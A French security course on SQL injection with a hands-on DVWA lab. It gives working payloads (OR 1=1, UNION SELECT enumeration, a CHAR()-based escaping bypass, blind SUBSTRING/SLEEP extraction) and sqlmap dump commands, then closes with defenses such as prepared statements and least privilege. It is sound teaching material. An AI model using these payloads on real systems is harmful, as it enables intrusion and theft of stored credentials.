# Cours : SQL Injection (SQLi) - Fondamentaux Théoriques et Exploitation Basique

## Objectifs pédagogiques

À l'issue de ce cours, l'étudiant sera capable de :
- Comprendre la nature technique des vulnérabilités SQL Injection
- Analyser les vecteurs d'attaque et leur mécanisme
- Exploiter des vulnérabilités SQLi basiques sur un environnement contrôlé (DVWA)
- Utiliser SQLMap pour l'automatisation des attaques
- Distinguer les types d'injection SQL (In-band, Blind)
- Appréhender les mécanismes de protection et leurs limites

---

## Partie 1 : Fondamentaux Théoriques

### 1.1 Définition et nature de SQL Injection

La SQL Injection (SQLi) est une vulnérabilité de sécurité dans les applications web permettant à un attaquant d'insérer du code SQL malveillant dans des champs de saisie utilisateur. Cette injection s'effectue par l'intermédiaire de paramètres non sécurisés (formulaires, paramètres URL, cookies) qui sont directement concaténés dans des requêtes SQL.

**Mécanisme fondamental** : L'application web ne valide pas ou n'encode pas correctement les données fournies par l'utilisateur avant de les inclure dans une requête SQL. Lorsque la base de données interprète cette requête, le code SQL injecté est exécuté, permettant à l'attaquant de manipuler la requête originale.

**Classification OWASP** : SQLi appartient à la catégorie A03:2021 – Injection dans l'OWASP Top 10, ce qui souligne sa criticité dans le paysage actuel des menaces web.

### 1.2 Contexte des bases de données relationnelles

Pour comprendre SQLi, il est essentiel de maîtriser le fonctionnement des requêtes SQL :

**Structure d'une requête SQL** :
```sql
SELECT colonne1, colonne2 FROM table WHERE condition
```

**Concaténation vulnérable** : Lorsque l'application concatène directement l'entrée utilisateur dans la requête :
```php
$query = "SELECT * FROM users WHERE username='" . $username . "'";
```

Si `$username` contient `' OR 1=1; --`, la requête devient :
```sql
SELECT * FROM users WHERE username='' OR 1=1; -- '
```

### 1.3 Modèle de menace et impact

L'impact d'une attaque SQLi dépend directement du contexte de la requête et des permissions du compte de base de données :

| Vecteur d'attaque | Impact technique | Conséquence opérationnelle |
|-------------------|------------------|----------------------------|
| **Authentification bypassée** | `' OR 1=1; --` | Connexion sans mot de passe |
| **Lecture de données sensibles** | `UNION SELECT` | Dump de toutes les tables |
| **Modification de données** | `UPDATE` | Altération de données |
| **Suppression de données** | `DELETE`, `DROP TABLE` | Perte de données |
| **Escalade de privilèges** | `LOAD_FILE()`, `INTO OUTFILE` | Exécution de commandes OS |

---

## Partie 2 : Typologie des Attaques SQLi

### 2.1 Analyse comparative des types

La classification des attaques SQLi repose sur la manière dont les résultats sont obtenus :

| Type | Mécanisme | Résultat visible | Complexité |
|------|-----------|------------------|------------|
| **In-band SQLi** | Résultat affiché directement dans la page | Oui | Faible |
| **Blind SQLi** | Inférence basée sur comportement de l'application | Non | Élevée |
| **Out-of-band SQLi** | Exfiltration via canaux externes (DNS, HTTP) | Indirect | Très élevée |

### 2.2 Analyse détaillée des types

#### a) In-band SQLi

**Portée** : Les résultats de l'injection sont directement visibles dans la réponse HTTP.

**Caractéristiques** :
- Le type le plus courant et le plus facile à exploiter
- Utilise `UNION SELECT` pour extraire des données d'autres tables
- Nécessite que l'application affiche les résultats de la requête

**Exemple** :
```sql
1' UNION SELECT username, password FROM users; --
```

#### b) Blind SQLi

**Portée** : L'application ne retourne pas de résultats visibles, mais le comportement diffère selon la validité de la requête.

**Sous-types** :

1. **Boolean-based Blind SQLi** : Inférence basée sur la réponse (vrai/faux)
2. **Time-based Blind SQLi** : Inférence basée sur des délais de réponse

**Caractéristiques** :
- Plus difficile à exploiter
- Nécessite une extraction caractère par caractère
- Utilise des fonctions comme `SUBSTRING()`, `SLEEP()`

#### c) Out-of-band SQLi

**Portée** : Les données sont exfiltrées via des canaux externes.

**Caractéristiques** :
- Très rare
- Nécessite des fonctionnalités spécifiques du SGBD
- Utilise `LOAD_FILE()`, `INTO OUTFILE`, ou requêtes DNS

---

## Partie 3 : Mise en Pratique sur DVWA

### 3.1 Configuration de l'environnement

DVWA (Damn Vulnerable Web Application) est une application web intentionnellement vulnérable conçue pour l'apprentissage des techniques de test d'intrusion.

**Configuration initiale** :
1. Accéder à l'interface DVWA
2. Naviguer vers "DVWA Security"
3. Sélectionner le niveau de sécurité : "Low"
4. Les niveaux Medium et High implémentent des protections croissantes

### 3.2 Exploitation SQLi (Low Security)

#### Analyse du code vulnérable

Le module SQL Injection de DVWA contient le code PHP suivant :

```php
<?php
if (isset($_GET['id'])) {
    $id = $_GET['id'];

    // Requête SANS validation
    $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
    
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    
    while ($row = mysqli_fetch_assoc($result)) {
        echo "<div>{$row['first_name']} {$row['last_name']}</div>";
    }
}
?>
```

**Analyse de la vulnérabilité** :
- La variable `$id` est directement concaténée dans la requête SQL
- Aucune validation ou échappement n'est effectué
- Les quotes autour de `$id` permettent de manipuler la structure de la requête

#### Test de confirmation

**Payload de test** :
```
1'
```

**Requête SQL générée** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1''
```

**Résultat attendu** :
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

**Conclusion** : L'erreur SQL confirme la vulnérabilité.

#### Exploitation basique : OR 1=1

**Payload** :
```
1' OR 1=1; --[ESPACE]
```

**Requête SQL générée** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1; -- '
```

**Analyse du payload** :

| Séquence | Fonction |
|----------|----------|
| `1'` | Ferme la quote du paramètre original |
| `OR` | Opérateur logique OU |
| `1=1` | Condition toujours vraie |
| `;` | Séparateur de requêtes (optionnel) |
| `--[ESPACE]` | Commentaire SQL (ignore le reste) |

**Résultat** : Toutes les lignes de la table `users` sont retournées car la condition `1=1` est toujours vraie.

#### Exploitation avancée : UNION SELECT

**Principe** : L'opérateur `UNION` combine les résultats de deux requêtes SELECT.

**Étape 1 : Déterminer le nombre de colonnes**

Utilisation de `ORDER BY` pour identifier le nombre de colonnes :

```
1' ORDER BY 1 --[ESPACE]
1' ORDER BY 2 --[ESPACE]
1' ORDER BY 3 --[ESPACE]
```

**Analyse** :
- `ORDER BY 1` : Succès (au moins 1 colonne)
- `ORDER BY 2` : Succès (au moins 2 colonnes)
- `ORDER BY 3` : Erreur (moins de 3 colonnes)

**Conclusion** : La requête a 2 colonnes.

**Étape 2 : Validation de UNION**

**Payload** :
```
1' UNION SELECT 1, 2 --[ESPACE]
```

**Requête SQL** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1, 2 -- '
```

**Résultat** :
```
First name: admin
Surname: admin

First name: 1
Surname: 2
```

**Conclusion** : UNION fonctionne, les colonnes 1 et 2 sont affichées.

**Étape 3 : Énumération des bases de données**

**Payload** :
```
1' UNION SELECT 1, schema_name FROM information_schema.schemata --[ESPACE]
```

**Résultat** :
```
information_schema
dvwa
mysql
performance_schema
```

**Note** : `information_schema` est une base de données système MySQL contenant des métadonnées sur toutes les autres bases.

**Étape 4 : Énumération des tables**

**Payload** :
```
1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' --[ESPACE]
```

**Résultat** :
```
guestbook
users
```

**Étape 5 : Énumération des colonnes**

**Payload** :
```
1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --[ESPACE]
```

**Résultat** :
```
user_id
first_name
last_name
user
password
avatar
last_login
failed_login
```

**Étape 6 : Extraction des données**

**Payload** :
```
1' UNION SELECT user, password FROM users --[ESPACE]
```

**Résultat** :
```
admin | 5f4dcc3b5aa765d61d8327deb882cf99
gordonb | e99a18c428cb38d5f260853678922e03
1337 | 8d3533d75ae2c3966d7e0d4fcc69216b
pablo | 0d107d09f5bbe40cade3de5c71e9e9b7
smithy | 5f4dcc3b5aa765d61d8327deb882cf99
```

**Analyse** : Les mots de passe sont stockés sous forme de hash MD5 (ex: `5f4dcc3b5aa765d61d8327deb882cf99` = "password").

---

### 3.3 Contournement de protections (Medium Security)

#### Analyse du filtre

Au niveau Medium, DVWA implémente une protection basique :

```php
<?php
if (isset($_POST['id'])) {
    // Protection : mysqli_real_escape_string()
    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_POST['id']);

    $query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
    
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    
    while ($row = mysqli_fetch_assoc($result)) {
        echo "<div>{$row['first_name']} {$row['last_name']}</div>";
    }
}
?>
```

**Changements** :
- Méthode POST au lieu de GET
- `mysqli_real_escape_string()` pour échapper les quotes
- **Absence de quotes** autour de `$id` : `WHERE user_id = $id`

#### Impact de mysqli_real_escape_string()

Cette fonction échappe les caractères spéciaux :

```php
Input: 1' OR 1=1; --
Après échappement: 1\' OR 1=1; --
```

**Requête générée** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = 1\' OR 1=1; --
```

**Résultat** : Erreur de syntaxe SQL.

#### Technique de contournement

**Observation clé** : La requête n'utilise pas de quotes autour de `$id` :
```sql
WHERE user_id = $id  ← Pas de quotes !
```

**Stratégie** : Utiliser des payloads numériques (sans quotes).

**Payload** :
```
1 UNION SELECT 1, 2
```

**Requête générée** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT 1, 2
```

**Résultat** :
```
First name: admin
Surname: admin

First name: 1
Surname: 2
```

**Bypass réussi** : Pas besoin de quotes car `$id` est numérique.

#### Contournement pour les chaînes de caractères

**Problème** : `table_schema='dvwa'` nécessite des quotes.

**Solution** : Utiliser la fonction `CHAR()` pour convertir les codes ASCII en caractères.

**Conversion** :
```
d = ASCII 100
v = ASCII 118
w = ASCII 119
a = ASCII 97
```

**Payload** :
```
1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=CHAR(100,118,119,97)
```

**Résultat** :
```
guestbook
users
```

**Extraction des colonnes** :
```
1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_schema=CHAR(100,118,119,97) AND table_name=CHAR(117,115,101,114,115)
```

**Extraction des données** :
```
1 UNION SELECT user, password FROM users
```

**Leçon fondamentale** : Les filtres basés sur l'échappement des quotes sont contournables en utilisant des payloads numériques ou des fonctions de conversion.

---

## Partie 4 : Automatisation avec SQLMap

### 4.1 Principe de SQLMap

SQLMap est un outil open source d'automatisation d'attaques SQL Injection. Il détecte et exploite automatiquement les vulnérabilités SQLi.

**Fonctionnalités principales** :
- Détection automatique de SQLi
- Identification du type d'injection (In-band, Blind)
- Énumération des bases de données, tables, colonnes
- Extraction des données
- Accès au système de fichiers (si permissions)

### 4.2 Préparation de la requête

**Sauvegarde de la requête HTTP** :

Depuis un proxy d'interception (OWASP ZAP, Burp Suite) :
1. Capturer la requête POST vers `/vulnerabilities/sqli/`
2. Enregistrer la requête brute dans un fichier

**Contenu du fichier (sqli_request.raw)** :
```http
POST /vulnerabilities/sqli/ HTTP/1.1
Host: servertcm:8001
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Cookie: PHPSESSID=abc123; security=medium

id=1&Submit=Submit
```

### 4.3 Détection de vulnérabilité

**Commande de base** :
```bash
sqlmap -r sqli_request.raw --dbms mysql
```

**Paramètres** :
- `-r` : Fichier de requête HTTP brute
- `--dbms mysql` : Spécifier le SGBD (accélère les tests)

**Résultat attendu** :
```
[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] target URL appears to have 2 columns in query
[INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

POST parameter 'id' is vulnerable.
```

**Analyse** :
- SQLMap teste automatiquement différents types d'injection
- Il détermine le nombre de colonnes avec `ORDER BY`
- Il confirme la vulnérabilité avec `UNION SELECT NULL, NULL`

### 4.4 Énumération et extraction

**Lister les bases de données** :
```bash
sqlmap -r sqli_request.raw --dbms mysql --dbs
```

**Résultat** :
```
available databases:
[*] information_schema
[*] dvwa
[*] mysql
[*] performance_schema
[*] sys
```

**Lister les tables de la base dvwa** :
```bash
sqlmap -r sqli_request.raw --dbms mysql -D dvwa --tables
```

**Résultat** :
```
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```

**Lister les colonnes de la table users** :
```bash
sqlmap -r sqli_request.raw --dbms mysql -D dvwa -T users --columns
```

**Résultat** :
```
Database: dvwa
Table: users
[7 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| user_id      | int          |
| user         | varchar      |
| password     | varchar      |
| first_name   | varchar      |
| last_name    | varchar      |
| avatar       | varchar      |
| last_login   | varchar      |
+--------------+--------------+
```

**Extraire les données** :
```bash
sqlmap -r sqli_request.raw --dbms mysql -D dvwa -T users --dump
```

**Résultat** :
```
Database: dvwa
Table: users
[5 entries]
+---------+------------+-----------+----------------------------------+
| user_id | user       | first_name | password                        |
+---------+------------+-----------+----------------------------------+
| 1       | admin      | admin     | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2       | gordonb    | Gordon    | e99a18c428cb38d5f260853678922e03 |
| 3       | 1337       | Hack      | 8d3533d75ae2c3966d7e0d4fcc69216b |
| 4       | pablo      | Pablo     | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| 5       | smithy     | Bob       | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+------------+-----------+----------------------------------+
```

---

## Partie 5 : Blind SQL Injection

### 5.1 Définition et contexte

**Blind SQL Injection** : Type de SQLi où l'application ne retourne pas de résultats visibles (données de la requête), mais peut être exploitée en observant le comportement de l'application.

**Contexte d'utilisation** :
- L'application ne retourne pas les résultats de la requête
- Les erreurs SQL ne sont pas affichées
- Seuls des messages génériques sont retournés

### 5.2 Boolean-based Blind SQLi

**Principe** : Injecter une condition vraie ou fausse et observer la réponse de l'application.

**Exemple DVWA (Blind)** :
- Input valide : "User ID exists"
- Input invalide : "User ID is MISSING"

**Payload de test** :
```
1' AND 1=1 --[ESPACE]
```

**Requête SQL** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=1 -- '
```

**Analyse** :
- `1=1` est toujours vrai
- La condition `WHERE` est vraie
- Résultat : "User ID exists"

**Payload de test** :
```
1' AND 1=2 --[ESPACE]
```

**Requête SQL** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 -- '
```

**Analyse** :
- `1=2` est toujours faux
- La condition `WHERE` est fausse
- Résultat : "User ID is MISSING"

**Extraction de données caractère par caractère** :

Pour extraire le premier caractère du premier username :
```sql
1' AND SUBSTRING((SELECT user FROM users LIMIT 1), 1, 1) = 'a' --[ESPACE]
```

**Analyse** :
- `SUBSTRING()` extrait une partie d'une chaîne
- `LIMIT 1` sélectionne la première ligne
- Si le premier caractère est 'a', la condition est vraie → "User ID exists"
- Sinon, la condition est fausse → "User ID is MISSING"

**Processus d'extraction** :
1. Tester 'a' → Si faux, tester 'b'
2. Continuer jusqu'à trouver le bon caractère
3. Répéter pour chaque position du caractère
4. Répéter pour chaque ligne

### 5.3 Time-based Blind SQLi

**Principe** : Injecter une requête qui provoque un délai si une condition est vraie.

**Fonction SQL** : `SLEEP()` (MySQL)

**Payload de test** :
```
1' AND SLEEP(5) --[ESPACE]
```

**Requête SQL** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5) -- '
```

**Comportement** :
- Si vulnérable : Réponse après 5 secondes
- Si non vulnérable : Réponse immédiate

**Extraction de données** :

Pour tester si le premier caractère est 'a' :
```sql
1' AND IF(SUBSTRING((SELECT user FROM users LIMIT 1), 1, 1) = 'a', SLEEP(5), 0) --[ESPACE]
```

**Analyse** :
- `IF(condition, valeur_si_vrai, valeur_si_faux)`
- Si le premier caractère est 'a' : `SLEEP(5)` est exécuté → Délai de 5 secondes
- Sinon : `0` est retourné → Pas de délai

### 5.4 SQLMap pour Blind Injection

**Sauvegarde de la requête** :

```http
GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1
Host: servertcm:8001
Cookie: PHPSESSID=abc123; security=low
```

**Commande SQLMap** :
```bash
sqlmap -r blind_request.raw --dbms mysql
```

**Résultat** :
```
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

**Analyse** :
- SQLMap détecte automatiquement le type d'injection
- Il utilise des techniques boolean-based et time-based
- Il extrait les données sans affichage direct

---

## Partie 6 : Mécanismes de Protection

### 6.1 Prepared Statements (Recommandé)

**Principe** : Séparer le code SQL des données utilisateur.

**Implémentation PHP (PDO)** :
```php
<?php
// Préparer la requête avec placeholders
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");

// Bind et exécuter
$stmt->execute([$username, $password]);

// Résultat
$user = $stmt->fetch();
?>
```

**Avantages** :
- Les paramètres sont traités comme des données, jamais comme du code SQL
- Protection automatique contre toutes les injections
- Portable entre différents SGBD
- Performance améliorée (réutilisation des requêtes préparées)

**Exemple d'injection bloquée** :
```php
Input: username = admin' OR 1=1; --
Requête préparée: SELECT * FROM users WHERE username = ? AND password = ?
Paramètres: ['admin\' OR 1=1; --', '...']
→ Cherche littéralement username "admin' OR 1=1; --" (qui n'existe pas)
```

### 6.2 ORM (Object-Relational Mapping)

**Principe** : Utiliser une couche d'abstraction qui génère automatiquement des requêtes sécurisées.

**Exemple Doctrine (PHP)** :
```php
$user = $entityManager->getRepository(User::class)->findOneBy([
    'username' => $username,
    'password' => $password
]);
```

**Exemple SQLAlchemy (Python)** :
```python
user = session.query(User).filter_by(username=username, password=password).first()
```

**Avantages** :
- Les ORM génèrent automatiquement des requêtes préparées
- Abstraction du SQL
- Protection contre les injections par défaut

### 6.3 Validation stricte des inputs

**Principe** : Valider que l'entrée correspond au format attendu.

**Whitelist (approche recommandée)** :
```php
<?php
// ID doit être numérique
if (!is_numeric($id)) {
    die("Invalid ID");
}

// Email doit être valide
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email");
}

// Longueur maximale
if (strlen($username) > 50) {
    die("Username too long");
}
?>
```

### 6.4 Principe du moindre privilège

**Principe** : Le compte de base de données utilisé par l'application doit avoir les permissions minimales nécessaires.

**Mauvaise configuration** :
```sql
-- Compte app avec tous les droits
GRANT ALL PRIVILEGES ON *.* TO 'webapp'@'localhost';
```

**Bonne configuration** :
```sql
-- Compte avec droits minimaux
GRANT SELECT, INSERT, UPDATE ON dvwa.users TO 'webapp'@'localhost';
-- Pas de DROP, DELETE, FILE, etc.
```

**Impact** : Même si une injection SQL réussit, l'attaquant ne peut pas supprimer des tables ou lire des fichiers système.

### 6.5 WAF (Web Application Firewall)

**Principe** : Filtrer les requêtes malveillantes avant qu'elles n'atteignent l'application.

**Exemple ModSecurity (Apache)** :
```apache
SecRule ARGS "@detectSQLi" \
    "id:1000,phase:2,deny,status:403,msg:'SQL Injection detected'"
```

**Avantages** :
- Protection supplémentaire
- Détection de patterns connus
- Centralisation des règles de sécurité

**Limitations** :
- Peut générer des faux positifs
- Ne remplace pas le codage sécurisé
- Les attaquants peuvent contourner les filtres

---

## Partie 7 : Synthèse et Points Clés

### Concepts fondamentaux

1. **Nature de SQLi** : Vulnérabilité d'injection permettant de manipuler des requêtes SQL via des inputs utilisateur non sécurisés.

2. **Mécanisme** : Concaténation directe de l'entrée utilisateur dans la requête SQL sans validation ou échappement.

3. **Typologie** : Trois types principaux basés sur la visibilité des résultats : In-band, Blind, Out-of-band.

### Vecteurs d'exploitation

- **Payload basique** : `' OR 1=1; --`
- **UNION SELECT** : Extraction de données d'autres tables
- **ORDER BY** : Détermination du nombre de colonnes
- **Blind Boolean** : Inférence basée sur vrai/faux
- **Blind Time** : Inférence basée sur des délais (SLEEP)

### Techniques de contournement

- **Échappement de quotes** : `mysqli_real_escape_string()` contournable avec payloads numériques
- **Fonctions de conversion** : `CHAR()` pour éviter les quotes
- **Commentaires SQL** : `--[ESPACE]` pour ignorer le reste de la requête

### Mécanismes de protection

1. **Prepared Statements** : Mesure fondamentale, sépare code et données
2. **ORM** : Couche d'abstraction sécurisée
3. **Validation serveur** : Vérification des formats attendus
4. **Moindre privilège** : Permissions minimales pour le compte DB
5. **WAF** : Filtrage supplémentaire des requêtes

### Limites des protections

- Les filtres basés sur l'échappement sont contournables
- Les validations côté client sont aisément contournables
- Aucune protection unique n'est suffisante
- La défense en profondeur est nécessaire

---

## Conclusion

Ce cours a présenté les fondements théoriques et pratiques des attaques SQL Injection. La compréhension des différents types d'injection (In-band, Blind) est essentielle pour évaluer leur criticité et choisir les techniques d'exploitation appropriées.

L'automatisation avec SQLMap permet d'accélérer considérablement le processus d'énumération et d'extraction, mais la compréhension manuelle des vecteurs d'attaque reste indispensable pour analyser les vulnérabilités complexes.

La protection efficace repose sur l'utilisation systématique de prepared statements, complétée par une validation rigoureuse des inputs, le principe du moindre privilège, et éventuellement un WAF pour une défense en profondeur.

---

## Glossaire

| Terme | Définition |
|-------|------------|
| **SQLi** | SQL Injection : Injection de code SQL dans des requêtes de base de données |
| **SGBD** | Système de Gestion de Base de Données (ex: MySQL, PostgreSQL) |
| **Payload** | Code malveillant injecté par l'attaquant |
| **UNION SELECT** | Opérateur SQL combinant les résultats de deux requêtes |
| **Blind SQLi** | Injection SQL sans retour direct de résultats |
| **Prepared Statement** | Requête SQL précompilée avec paramètres sécurisés |
| **ORM** | Object-Relational Mapping : Couche d'abstraction base de données |
| **WAF** | Web Application Firewall : Pare-feu applicatif web |
| **SLEEP()** | Fonction SQL provoquant un délai (utilisé pour Blind Time-based) |
| **information_schema** | Base de données système MySQL contenant des métadonnées |
